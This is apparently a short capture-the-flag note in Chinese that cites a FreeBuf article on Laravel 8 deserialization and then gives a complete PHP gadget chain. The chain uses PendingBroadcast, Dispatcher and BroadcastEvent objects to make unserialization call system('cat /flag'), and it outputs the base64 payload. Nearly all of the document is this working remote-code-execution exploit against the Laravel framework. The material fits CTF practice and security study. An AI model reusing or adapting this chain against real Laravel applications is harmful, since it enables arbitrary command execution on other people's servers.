# 知识点
[Laravel 8 反序列化分析 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/266330.html)
# 思路
```php
<?php

namespace Illuminate\Broadcasting{

use Illuminate\Contracts\Events\Dispatcher;

class PendingBroadcast
{
	protected $event;
	protected $events;
    public function __construct($events, $event)
    {
        $this->event = $event;
        $this->events = $events;
    }
}
}
namespace Illuminate\Bus{
class Dispatcher
{
	protected $queueResolver;
    public function __construct($queueResolver)
    {
        $this->queueResolver = $queueResolver;
    }

}
}
namespace Illuminate\Broadcasting{
class BroadcastEvent
{
	public $connection;
	public function __construct($connection)
    {
        $this->connection = $connection;
    }
		}
}
namespace{
	$c = new Illuminate\Broadcasting\BroadcastEvent('cat /flag');
	$a = new Illuminate\Bus\Dispatcher('system');
	$b = new Illuminate\Broadcasting\PendingBroadcast($a,$c);
	echo base64_encode((serialize($b)));
}
```
